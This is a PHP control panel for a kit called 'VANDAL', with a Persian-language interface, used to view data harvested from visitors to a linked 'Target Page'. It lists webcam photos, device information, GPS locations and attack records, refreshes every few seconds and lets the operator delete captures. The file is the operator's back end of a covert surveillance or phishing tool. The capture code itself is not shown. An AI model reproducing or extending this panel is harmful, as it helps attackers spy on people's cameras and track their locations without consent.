<?php
/**
 * VANDAL Kit - Control Panel
 * View captured photos and data
 */
$cams = glob('webcam_*.jpg');
$devices = glob('device_*.json');
$gpsData = glob('gps_*.json');
$attacks = glob('attack_start_*.json');

rsort($cams);
rsort($devices);
rsort($gpsData);
rsort($attacks);

// Delete file
if (isset($_GET['del'])) {
    $file = basename($_GET['del']);
    if (is_file($file)) {
        unlink($file);
        // Delete associated JSON
        $jsonFile = str_replace('.jpg', '.json', $file);
        if (is_file($jsonFile)) unlink($jsonFile);
    }
    header('Location: panel.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VANDAL Control Panel</title>
    <meta http-equiv="refresh" content="8">
    <style>
        :root {
            --bg: #06060d;
            --card: #0d0d1a;
            --border: #1a1a30;
            --text: #c8c8d8;
            --accent: #ff3838;
            --green: #00dd55;
            --blue: #4499ff;
            --gold: #ffaa00;
        }
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:var(--bg);
            background-image:radial-gradient(ellipse at 30% 20%,rgba(255,0,0,0.04) 0%,transparent 60%),
                              radial-gradient(ellipse at 70% 60%,rgba(0,100,255,0.04) 0%,transparent 60%);
            color:var(--text);font-family:system-ui,sans-serif;min-height:100vh;padding:20px
        }
        .container{max-width:1400px;margin:0 auto}
        header{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:24px}
        h1{color:var(--accent);font-size:24px;font-weight:800;letter-spacing:-.5px}
        h1 span{color:rgba(255,255,255,0.3);font-size:14px;font-weight:400}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:24px}
        .stat{
            background:var(--card);border:1px solid var(--border);border-radius:12px;
            padding:16px 18px;text-align:center
        }
        .stat-num{font-size:28px;font-weight:700;color:var(--accent)}
        .stat-label{font-size:10px;color:rgba(255,255,255,0.35);margin-top:4px;text-transform:uppercase;letter-spacing:1px}
        .stat.green .stat-num{color:var(--green)}
        .stat.blue .stat-num{color:var(--blue)}
        .stat.gold .stat-num{color:var(--gold)}
        .actions{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
        .btn{
            display:inline-flex;align-items:center;gap:6px;padding:8px 16px;
            border-radius:8px;font-size:12px;font-weight:600;text-decoration:none;
            border:none;cursor:pointer;transition:all .2s
        }
        .btn-primary{background:linear-gradient(135deg,var(--accent),#cc0000);color:#fff}
        .btn-ghost{background:rgba(255,255,255,0.05);border:1px solid var(--border);color:rgba(255,255,255,0.6)}
        .btn-ghost:hover{background:rgba(255,255,255,0.08)}
        .btn-danger{background:rgba(255,50,50,0.1);border:1px solid rgba(255,50,50,0.2);color:var(--accent)}
        h2{font-size:15px;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:10px;margin:24px 0 14px}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
        .card{
            background:var(--card);border:1px solid var(--border);border-radius:12px;
            padding:8px;text-align:center;transition:all .3s
        }
        .card:hover{border-color:#333;transform:translateY(-2px)}
        .card img{width:100%;border-radius:8px;cursor:pointer}
        .card .meta{font-size:10px;color:rgba(255,255,255,0.4);margin-top:6px;display:flex;justify-content:space-between;align-items:center;gap:4px}
        .card .meta a{color:var(--accent);text-decoration:none;font-size:10px}
        .card .meta a:hover{text-decoration:underline}
        .log-box{
            background:var(--card);border:1px solid var(--border);border-radius:10px;
            padding:14px;max-height:300px;overflow-y:auto;margin-bottom:12px
        }
        .log-box pre{
            font-size:10px;font-family:'Courier New',monospace;color:rgba(255,255,255,0.5);
            white-space:pre-wrap;word-break:break-all;direction:ltr;text-align:left
        }
        .empty{color:rgba(255,255,255,0.2);text-align:center;padding:40px;font-size:14px}
        @media(max-width:768px){body{padding:12px}.grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}}
    </style>
</head>
<body>
<div class="container">
    <header>
        <h1>⚡ VANDAL <span>Control Panel v1.0</span></h1>
        <div class="actions">
            <a href="panel.php" class="btn btn-ghost">🔄 Refresh</a>
            <a href="index.html" class="btn btn-primary" target="_blank">🎯 Target Page</a>
        </div>
    </header>

    <div class="stats">
        <div class="stat"><div class="stat-num"><?=count($cams)?></div><div class="stat-label">📸 Webcam Photos</div></div>
        <div class="stat green"><div class="stat-num"><?=count($devices)?></div><div class="stat-label">📱 Device Info</div></div>
        <div class="stat gold"><div class="stat-num"><?=count($gpsData)?></div><div class="stat-label">📍 GPS Locations</div></div>
        <div class="stat blue"><div class="stat-num"><?=count($attacks)?></div><div class="stat-label">🎯 Attacks</div></div>
    </div>

    <h2>📸 Webcam Captures</h2>
    <div class="grid">
        <?php if(count($cams) > 0): ?>
            <?php foreach($cams as $cam): ?>
            <div class="card">
                <img src="<?=$cam?>" onclick="window.open(this.src)" loading="lazy">
                <div class="meta">
                    <span><?=$cam?></span>
                    <a href="?del=<?=urlencode($cam)?>" onclick="return confirm('حذف شود؟')">🗑</a>
                </div>
            </div>
            <?php endforeach; ?>
        <?php else: ?>
            <div class="empty">📭 Waiting for camera data...</div>
        <?php endif; ?>
    </div>

    <h2>📱 Device Information</h2>
    <?php if(count($devices) > 0): ?>
        <?php foreach(array_slice($devices, 0, 5) as $dev): ?>
        <div class="log-box">
            <pre><?=htmlspecialchars(file_get_contents($dev))?></pre>
        </div>
        <?php endforeach; ?>
    <?php else: ?>
        <div class="empty">No device data yet</div>
    <?php endif; ?>

    <h2>📍 GPS Locations</h2>
    <?php if(count($gpsData) > 0): ?>
        <?php foreach(array_slice($gpsData, 0, 5) as $gps): ?>
        <div class="log-box">
            <pre><?=htmlspecialchars(file_get_contents($gps))?></pre>
        </div>
        <?php endforeach; ?>
    <?php else: ?>
        <div class="empty">No GPS data yet</div>
    <?php endif; ?>
</div>
</body>
</html>